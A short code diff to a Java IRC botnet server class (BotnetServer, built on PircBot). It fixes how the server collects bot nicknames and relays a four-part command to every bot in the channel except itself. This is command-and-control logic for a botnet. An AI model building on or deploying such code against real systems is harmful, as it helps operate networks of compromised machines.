@@ -150,16 +150,16 @@ public class BotnetServer extends PircBot {
 					User[] bots = getUsers(CHANNEL);
 					botNames = new String[bots.length];
 					for (int i = 0; i < bots.length; i++) {
-						if (bots[i].getNick().equals(NAME)) {
-							botNames[i] = bots[i].getNick();
-						}
+						botNames[i] = bots[i].getNick();
 					}
 				} else {
 					botNames = Arrays.copyOfRange(parts, 4, parts.length);
 				}
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
 				for (int i = 0; i < botNames.length; i++) {
-					this.sendMessage(botNames[i], command);
+					if (!botNames[i].equals(NAME)) {
+						this.sendMessage(botNames[i], command);
+					}
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
